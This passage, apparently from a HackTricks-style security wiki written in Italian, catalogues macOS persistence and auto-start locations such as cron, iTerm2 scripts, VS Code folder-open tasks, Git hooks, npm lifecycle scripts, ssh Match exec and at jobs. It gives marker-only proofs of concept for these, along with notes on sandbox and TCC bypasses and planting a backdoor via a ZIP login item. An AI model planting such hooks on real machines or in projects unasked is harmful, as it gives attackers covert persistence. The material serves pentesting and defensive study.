  - **Trigger**: La pianificazione nel crontab installato. `at` e `periodic` sono meccanismi distinti, descritti di seguito.

#### Descrizione e sfruttamento

Elenca i cron job dell'**utente corrente** con:

```bash
crontab -l
```

Il plist launchd del demone cron di sistema contiene una voce `QueueDirectories` per `/usr/lib/cron/tabs`; qui vengono conservati i crontab degli utenti installati. Per esaminare i crontab di altri utenti servono i privilegi di root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In un account usa e getta, è possibile installare una voce cron utente contenente solo un marker con `crontab` e rimuoverla dopo averla osservata. L'esecuzione di `crontab <file>` **sostituisce l'intero crontab esistente dell'account**, quindi salvalo e ripristinalo se l'account non è usa e getta:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
- Aggiramento TCC: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 in passato aveva permessi TCC concessi

#### Posizioni

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Trigger**: Avviare iTerm2 con uno script Python API idoneo in quella cartella
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Trigger**: Avviare iTerm2; l'hook di avvio AppleScript è documentato separatamente
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Trigger**: Creare una sessione con il profilo il cui comando o testo iniziale richiama il payload

#### Descrizione e sfruttamento

La [guida attuale all'API Python di iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documenta gli script **Python** eseguiti automaticamente in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Non stabilisce che un file `.sh` eseguibile qualsiasi in quella cartella venga eseguito. Per un account usa-e-getta, salvare questo file come `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

La [guida AppleScript attuale di iTerm2](https://iterm2.com/documentation-scripting.html) documenta separatamente `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, con un percorso di fallback legacy `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` quando la cartella moderna non esiste. Uno script AppleScript contenente solo un marker è:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Questi esempi di script sono stati verificati consultando la documentazione di iTerm2, non eseguendoli nella sessione desktop attiva. Dopo aver effettuato i test in un account usa e getta, rimuovi lo script di test e `/tmp/ht-iterm-autolaunch-marker` oppure `/tmp/iterm2-autolaunchscpt`, rispettivamente.

Le preferenze di iTerm2, disponibili in **`~/Library/Preferences/com.googlecode.iterm2.plist`**, possono specificare un comando per il profilo o del testo iniziale. Quest'ultimo viene digitato in una sessione; la sua esecuzione dipende dall'interpretazione da parte di una shell. La [documentazione dei profili di iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) descrive il comando eseguito quando viene creata una nuova sessione con quel profilo.

Questa impostazione può essere configurata nelle impostazioni di iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E il comando viene riportato nelle preferenze:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Per una valutazione sicura, esamina il profilo selezionato nelle impostazioni di iTerm2 oppure leggi una copia del relativo file delle preferenze. Modificare `Initial Text` in un profilo attivo avrebbe effetto sulle sessioni di un utente, quindi non è stata modificata alcuna preferenza sul Mac di ricerca.

### xbar

Resoconto: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Utile per bypassare sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma xbar deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Richiede i permessi di Accessibility

#### Posizione

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Trigger**: quando xbar viene avviato

#### Descrizione

Se è installato il popolare programma [**xbar**](https://github.com/matryer/xbar), è possibile scrivere uno script shell in **`~/Library/Application\ Support/xbar/plugins/`**, che verrà eseguito all'avvio di xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma Hammerspoon deve essere installato
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Richiede i permessi di Accessibilità

#### Posizione

- **`~/.hammerspoon/init.lua`**
  - **Trigger**: quando Hammerspoon viene eseguito

#### Descrizione

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funge da piattaforma di automazione per **macOS**, utilizzando il **linguaggio di scripting LUA**. In particolare, supporta l'integrazione di codice AppleScript completo e l'esecuzione di shell script, ampliando notevolmente le sue capacità di scripting.<sup>[[13]](#references)</sup>

L'app cerca un singolo file, `~/.hammerspoon/init.lua`, e all'avvio esegue lo script.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma BetterTouchTool deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - Richiede i permessi Automation-Shortcuts e Accessibility

#### Posizione

- Un file script **già referenziato** da un preset BetterTouchTool abilitato, oppure la configurazione del preset in `~/Library/Application Support/BetterTouchTool/`. Il percorso preciso dello script dipende dalla configurazione del preset.

[Il riferimento alle azioni di BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) documenta le azioni per script shell e comandi in background. L'evento configurato per tastiera, mouse, touch, widget o altro deve verificarsi mentre il preset pertinente è attivo; [la guida ai trigger](https://docs.folivora.ai/docs/configuration/new-trigger/) mostra questa associazione. Un file qualsiasi nella directory di supporto dell'applicazione non è un trigger. Un'azione già configurata che carica uno script esterno scrivibile è un target write-to-execution più circoscritto. Il codice viene eseguito con l'account dell'utente di BetterTouchTool, nei limiti dei permessi macOS effettivamente concessi. BetterTouchTool non era presente in `/Applications` sul Mac di ricerca, quindi nessun preset è stato modificato o eseguito localmente.

### Alfred

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma Alfred deve essere installato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - Richiede i permessi Automation, Accessibility e persino Full-Disk access

#### Posizione

- Uno script o file **già referenziato** da un workflow Alfred installato, oppure il workflow nella directory `Alfred.alfredpreferences` configurata dall'utente. La directory delle preferenze può essere sincronizzata e non ha un percorso universale fisso.

[La guida ai workflow di Alfred](https://www.alfredapp.com/help/workflows/) descrive il requisito Powerpack e l'installazione tramite la sua UI. Deve attivarsi un hotkey, una keyword o un altro trigger configurato del workflow installato; [l'esempio di hotkey di Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) mostra un'azione script. [Il riferimento all'ambiente di Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) espone il percorso delle preferenze selezionato tramite `alfred_preferences`. Inserire un file workflow non registrato in una directory qualsiasi non dimostra che verrà installato o eseguito. Il codice viene eseguito come utente Alfred connesso, nei limiti dei permessi macOS effettivamente concessi. Alfred non era presente in `/Applications` sul Mac di ricerca, quindi questo percorso è stato valutato solo sulla base della documentazione.

### Script Commands di Raycast e aggiornamento delle extension

- **Target di scrittura:** uno script eseguibile in una directory **già aggiunta** in Raycast Settings → Script Commands. Raycast non esamina una directory appena creata a caso. [La guida Script Commands di Raycast](https://manual.raycast.com/script-commands) documenta la registrazione delle directory.
- **Trigger e identità:** un utente avvia il comando indicizzato, una hotkey o un fallback configurato lo avvia, oppure Raycast aggiorna uno script `inline` in base al suo `@raycast.refreshTime` configurato. Lo script viene eseguito come utente Raycast connesso tramite il suo interprete. Il [riferimento upstream ai metadati](https://github.com/raycast/script-commands#metadata) limita l'aggiornamento automatico ai comandi inline, mentre [il manifest delle extension di Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) supporta separatamente un `interval` per i comandi delle extension installate `no-view` o `menu-bar`. Aggiungere un normale script command non ne pianifica l'esecuzione.

Per un account usa e getta con una directory di script registrata, uno script inline che crea solo un marker è:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Salvalo nella directory registrata, rendilo eseguibile e lascia che Raycast lo aggiorni. Poi rimuovi quel file e `/tmp/ht-raycast-refresh-marker`. Raycast non è stato trovato con il suo consueto nome in `/Applications` sul Mac di ricerca, quindi questa procedura è documentata ma non è stata eseguita localmente. Le autorizzazioni per Accessibilità, Automazione e accesso ai file restano soggette alle richieste di macOS.

### Attività automatiche di workspace in Visual Studio Code

- **Destinazione di scrittura:** `.vscode/tasks.json` all'interno di un workspace che l'utente aprirà.
- **Trigger:** apertura di quel workspace in VS Code, ma solo se la cartella è considerata attendibile **e** le attività automatiche sono state consentite. Un workspace non attendibile non esegue mai attività automatiche; l'impostazione predefinita chiede all'utente prima della prima esecuzione automatica. La [documentazione sulle attività di VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) e la [documentazione su Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) descrivono entrambi i requisiti.
- **Identità di esecuzione:** l'account dell'utente di VS Code, tramite il processo dell'attività configurato. Si tratta di un'esecuzione specifica dell'applicazione, non di persistenza all'accesso.

In un **nuovo workspace usa e getta**, inserisci questa attività che crea solo un marker in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Dopo aver aperto l'area di lavoro attendibile e aver consentito l'esecuzione delle attività automatiche, verifica la presenza di `.autostart-task-ran`. Rimuovi la voce dell'attività e il marker per ripulire. **Questo comportamento è stato verificato sulla base della documentazione Microsoft e del bundle installato di VS Code 1.139.1; non è stato eseguito nella sessione desktop attiva.**

### Host di messaggistica nativa di Chrome

- **Percorso di scrittura:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` per l'utente corrente, oppure `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` per tutti gli utenti (è necessario disporre dei permessi di scrittura da admin). Chromium e Chrome for Testing usano directory diverse; consulta [la tabella aggiornata dei percorsi di Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Trigger:** Un'estensione Chrome installata con il permesso `nativeMessaging` chiama `chrome.runtime.connectNative()` o `chrome.runtime.sendNativeMessage()` usando il nome host esatto specificato nel manifest. Chrome avvia quindi l'eseguibile host. La sola apertura di Chrome non esegue un nuovo host nativo arbitrario; creare un manifest senza un'estensione che lo richiami non produce alcun effetto. [La guida di Chrome alla messaggistica nativa](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) documenta questo handshake.
- **Identità di esecuzione:** L'account dell'utente di Chrome. Il manifest deve indicare il percorso assoluto dell'eseguibile e consentire esplicitamente l'origine dell'estensione chiamante.

In un account browser usa-e-getta con un'estensione di test, la seguente coppia di file dimostra il collegamento tra scrittura ed esecuzione. Il nome del file manifest deve corrispondere al suo `name` e `TEST_EXTENSION_ID` deve essere sostituito con l'ID effettivo dell'estensione:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Salva questo JSON come `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. L'eseguibile che contiene solo il marker indicato in `path` nel manifest può contenere:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Dopo che l’estensione di test chiama `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` dal proprio service worker o dalla pagina dell’estensione, il marker dimostra che l’host è stato avviato. Questo host minimale non implementa il protocollo di risposta di Chrome con prefisso di lunghezza, quindi l’estensione potrebbe segnalare un errore di messaggistica dopo la scrittura del marker. Rimuovi il manifest di test, l’host e il marker per ripulire. Su macOS 26.5.2 erano presenti l’app Chrome e entrambe le directory dei manifest; **il profilo Chrome attivo non è stato modificato né utilizzato**.

### Comandi per gli eventi dei tasti di Karabiner-Elements

- **Destinazione della scrittura:** `~/.config/karabiner/karabiner.json` in un account in cui Karabiner-Elements è installato e in esecuzione. La [guida di Karabiner sulla posizione dei file](https://karabiner-elements.pqrs.org/docs/json/location/) afferma che l’app monitora e ricarica questo file dopo una scrittura. I file JSON in `assets/complex_modifications` sono solo preset importabili: scrivere un file in quella directory non abilita una regola.
- **Trigger:** l’evento del tasto configurato, dopo l’attivazione della regola. La [documentazione di riferimento di `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) descrive l’esecuzione dei comandi. Questo non comporta l’esecuzione di codice all’accesso o a ogni scrittura di file.
- **Identità di esecuzione:** l’utente autenticato che esegue il processo utente di Karabiner. Le autorizzazioni concesse all’app e gli eventuali accessi TCC dipendono dall’app e dalla versione.

Per un account di test usa e getta, aggiungi questo oggetto regola all’array `complex_modifications.rules` del profilo selezionato in `karabiner.json`, mantenendo inalterato il resto del profilo. Premi F18 per creare un marker innocuo, quindi rimuovi questa regola e il marker. La scelta di F18 evita di sostituire un normale tasto di digitazione:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements non era installato in `/Applications` sulla macchina di test macOS 26.5.2, quindi si tratta di una PoC basata sulla documentazione, non di un risultato ottenuto in esecuzione locale.

### Git hooks in un repository locale

- **Obiettivo di scrittura:** Un hook eseguibile come `<repo>/.git/hooks/post-checkout`. Se `core.hooksPath` è già stato impostato, usa invece la directory configurata. Un hook salvato come normale file sorgente tracciato non viene installato automaticamente in un clone.
- **Trigger:** L'operazione Git corrispondente. Ad esempio, `post-checkout` viene eseguito dopo `git checkout` o `git switch` e può essere eseguito anche dopo la creazione di un clone o di un worktree. Il [riferimento agli hook di Git](https://git-scm.com/docs/githooks) elenca gli eventi e il requisito del bit eseguibile; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) modifica la directory di ricerca.
- **Identità di esecuzione:** L'account che esegue Git. L'hook può essere eseguito solo se la directory effettiva degli hook del repository è scrivibile dall'attore e se in seguito l'utente esegue l'operazione Git pertinente.

Questa PoC, che crea solo un marker, crea un repository completamente sacrificabile, installa un hook e cambia branch. È stata eseguita con successo con Apple Git 2.50.1 su macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Script del ciclo di vita npm in un progetto

- **Obiettivo di scrittura:** la mappa `scripts` in `package.json` di un progetto scrivibile, oppure un pacchetto di dipendenze installato il cui script del ciclo di vita verrà eseguito dall'utente. È un hook del flusso di sviluppo, non un'esecuzione che avviene aprendo una directory.
- **Trigger e identità:** un successivo `npm install` o `npm ci`, con gli script del ciclo di vita consentiti, esegue `preinstall`, `install` e `postinstall` con l'identità dell'utente che invoca npm. Anche un normale `npm run <name>` esegue gli script `pre<name>` e `post<name>` corrispondenti. [Il riferimento al ciclo di vita di npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) elenca gli eventi; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) può impedire l'esecuzione degli script del ciclo di vita dell'installazione. La versione e le impostazioni dei criteri possono modificare ciò che è consentito, quindi verifica la versione di npm usata dal target.

Questa PoC che crea solo un marker è stata eseguita con npm locale in una directory vuota e usa e getta. Non scarica dipendenze né modifica il progetto dell'utente:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Questo è distinto dai file di avvio dell'interprete Python: npm deve eseguire la relativa azione di installazione o esecuzione, mentre il codice `site` di Python può essere caricato durante una normale invocazione dell'interprete. Analogamente, i target generici di `Makefile` e le definizioni di task di build richiedono che l'utente o uno strumento già configurato invochi quel target; non sono percorsi di avvio automatico del sistema operativo separati.

### Configurazione di avvio di Vim

- **Target di scrittura:** `~/.vimrc` per l'utente che avvierà Vim (o un altro file di avvio selezionato dall'ordine di inizializzazione di Vim). [La documentazione di riferimento sull'avvio di Vim](https://vimhelp.org/starting.txt.html) descrive il file e le opzioni di override `VIMINIT`/`EXINIT`.
- **Trigger:** Un successivo avvio normale di Vim che carica questa configurazione. `-u NONE` di Vim ignora il vimrc dell'utente. Si tratta di esecuzione specifica dell'editor, non di un trigger di accesso al sistema operativo.
- **Identità di esecuzione:** L'account dell'utente di Vim.

La seguente PoC isolata è stata eseguita contro `/usr/bin/vim` di macOS; non scrive preferenze reali di Vim né documenti aperti:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ha un percorso di configurazione utente separato, `$XDG_CONFIG_HOME/nvim/init.lua` o `init.vim`, e carica anche gli script nelle directory runtime `plugin/`, secondo la [documentazione sull'avvio](https://neovim.io/doc/user/starting/). Neovim non era installato sulla macchina di test macOS 26.5.2, quindi questa variante non è stata eseguita.

### Comandi di configurazione del client SSH

- **Percorso di scrittura:** `~/.ssh/config` o un altro file già incluso. Questo è un file di configurazione **client**; è separato dal file lato server `~/.ssh/rc` descritto di seguito.
- **Attivazione:** un'invocazione di `ssh` corrispondente. `Match exec` esegue un comando locale mentre il client valuta la configurazione, anche con `ssh -G`, che stampa la configurazione senza connettersi. `ProxyCommand` viene eseguito quando il client avvia una connessione corrispondente. `LocalCommand` viene eseguito solo dopo una connessione riuscita e richiede `PermitLocalCommand yes` (il valore predefinito è `no`). Questi meccanismi hanno tempistiche e prerequisiti diversi; la sola scrittura non li esegue. Consulta la documentazione upstream di [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Identità di esecuzione:** l'utente locale che esegue `ssh`. Sono necessari un host corrispondente, un file di configurazione applicabile e l'eventuale connessione richiesta. `ssh -F` può selezionare un file di configurazione diverso.

Questa PoC, che scrive solo un marker, è stata eseguita con il client SSH di Apple su macOS 26.5.2. `-G` verifica `Match exec` senza stabilire una connessione di rete né leggere la configurazione SSH reale dell'utente:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### File di inizializzazione del debugger

- **Destinazione di scrittura:** `~/.lldbinit` oppure il file specifico dell'applicazione con priorità più alta, ad esempio `~/.lldbinit-lldb`. LLDB ne legge uno all'avvio del debugger. Per impostazione predefinita, un `.lldbinit` nella directory corrente **non** viene eseguito; l'utente deve abilitare `target.load-cwd-lldbinit` o passare `--local-lldbinit`. Vedi il [manuale di LLDB](https://lldb.llvm.org/man/lldb.html).
- **Trigger e identità:** l'utente avvia LLDB senza `--no-lldbinit`; i comandi vengono eseguiti come tale utente. La semplice apertura di un progetto non implica che venga eseguito il suo `.lldbinit`.

Il seguente test con il solo marker è stato eseguito su LLDB in macOS 26.5.2, con directory home e directory di lavoro isolate:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Per **GDB**, la [documentazione upstream sull’avvio](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) elenca `$HOME/Library/Preferences/gdb/gdbinit` e poi `~/.gdbinit` su macOS. Un `.gdbinit` nella directory corrente è soggetto all’[auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), mentre `-nx`/`-nh` disabilitano i file di inizializzazione. GDB non era installato sul Mac di test, quindi questa variante non è stata eseguita in locale.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma ssh deve essere abilitato e utilizzato
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - L’uso di SSH consente di avere accesso FDA

#### Posizione

- **`~/.ssh/rc`**
  - **Attivazione**: accesso via ssh
- **`/etc/ssh/sshrc`**
  - È richiesto root
  - **Attivazione**: accesso via ssh

> [!CAUTION]
> Per abilitare ssh è necessario Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descrizione e sfruttamento

Per impostazione predefinita, a meno che in `/etc/ssh/sshd_config` non sia impostato `PermitUserRC no`, quando un utente **accede tramite SSH** vengono eseguiti gli script **`/etc/ssh/sshrc`** e **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementi di login**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma è necessario eseguire `osascript` con argomenti
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Percorsi

- **App helper registrata come elemento di login:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (percorso comune per gli elementi inclusi nel bundle).
  - **Attivazione:** la registrazione può avviare immediatamente l'helper; in seguito, questo si avvia agli accessi degli utenti, previa approvazione.
- **Agent/daemon incluso nel bundle e registrato:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` oppure `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Attivazione:** un agent approvato può avviarsi al momento della registrazione e agli accessi successivi; un daemon approvato si avvia all'avvio del sistema. Un daemon richiede l'approvazione di un amministratore.

#### Descrizione

In **Impostazioni di Sistema → Generali → Elementi login ed estensioni**, gli utenti possono controllare gli elementi di login e in background. macOS 13 e versioni successive offrono [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) per registrare elementi di login, launch agent e launch daemon inclusi nei bundle. Il comportamento di [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) varia in base al tipo e allo stato di approvazione. **Scrivere un helper in un bundle di un'app non basta per registrare un nuovo elemento di login.** Al contrario, se l'eseguibile di un helper già registrato è scrivibile, modificarlo può influire sul suo avvio successivo senza una nuova registrazione; verificare prima il percorso effettivo e i controlli della firma del codice.

Di seguito è riportato un metodo in sola lettura per cercare gli helper inclusi nei bundle su un Mac; non ne registra né avvia nessuno:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Per un plist di avvio incluso nel bundle, risolvi `BundleProgram` **relativamente alla radice dell'app bundle** (ad esempio `Contents/MacOS/Helper`), come specificato nelle [indicazioni di Apple per la migrazione di Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Un inventario in sola lettura di `/Applications` sul Mac di ricerca ha rilevato 14 voci helper incluse nei bundle e cinque dichiarazioni `BundleProgram`; tutti e cinque i percorsi di destinazione sono stati risolti e due hanno superato un controllo di scrivibilità da parte dell'utente. Questo controllo **non** dimostra che uno dei due helper sia registrato, abilitato, eseguibile dopo la convalida della firma o accessibile da una sandbox. `sfltool dumpbtm` ha elencato 150 record nominati su questo Mac; è uno strumento di ispezione, non un test che dimostri che ogni record sia in esecuzione.

Gli elementi di login meno recenti possono anche essere gestiti tramite Apple events. È possibile elencarli, aggiungerli e rimuoverli dalla riga di comando, anche se aggiungerli modifica la configurazione di login persistente dell'utente e potrebbe richiedere l'approvazione per Automazione:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` è un dettaglio di implementazione, non una posizione supportata in cui installare un payload semplicemente scrivendo un file. La vecchia API `SMLoginItemSetEnabled` è stata sostituita da `SMAppService` per i nuovi helper; il percorso `/var/db/com.apple.xpc.launchd/loginitems.501.plist` indicato in precedenza nella pagina era assente sul dispositivo di test con macOS 26.5.2. Per valutare i moderni elementi di login, usa l’API di registrazione e lo stato dell’interfaccia di sistema, non un percorso di database presunto.

### ZIP come elemento di login

(Consulta la sezione precedente sugli elementi di login: questa è un’estensione)

Se memorizzi un file **ZIP** come **elemento di login**, **`Archive Utility`** lo aprirà e, se ad esempio lo ZIP è stato memorizzato in **`~/Library`** e contiene la cartella **`LaunchAgents/file.plist`** con una backdoor, verrà creata quella cartella (non esiste per impostazione predefinita) e verrà aggiunto il plist; così, al successivo accesso dell’utente, **verrà eseguita la backdoor indicata nel plist**.

Un’altra opzione consiste nel creare i file **`.bash_profile`** e **`.zshenv`** nella HOME dell’utente; in questo modo la tecnica funzionerà anche se la cartella LaunchAgents esiste già.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ma devi **eseguire** **`at`** e deve essere **abilitato**
- Bypass di TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

- Devi **eseguire** **`at`** e deve essere **abilitato**

#### **Descrizione**

Le attività `at` sono progettate per **pianificare attività una tantum** da eseguire in orari specifici. A differenza dei cron job, le attività `at` vengono rimosse automaticamente dopo l’esecuzione. È importante notare che queste attività persistono anche dopo il riavvio del sistema, il che può renderle un potenziale problema di sicurezza in determinate condizioni.<sup>[[16]](#references)</sup>

Il file `com.apple.atrun.plist` incluso ha `Disabled = true`, ma launchd mantiene separatamente le override effettive di abilitazione/disabilitazione. Sul dispositivo di test con macOS 26.5.2, `launchctl print-disabled system` ha indicato `com.apple.atrun` come **abilitato**, nonostante quella chiave inclusa. Verifica lo stato effettivo prima di affermare che i job `at` verranno eseguiti:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Un amministratore può abilitare un servizio `atrun` disabilitato con `launchctl`; il seguente esempio storico modifica lo stato dei servizi di sistema e **non** è stato eseguito sul Mac di ricerca:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Questo creerà un file tra un’ora:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Controlla la coda dei job usando `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Qui sopra possiamo vedere due job pianificati. Possiamo stampare i dettagli del job usando `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
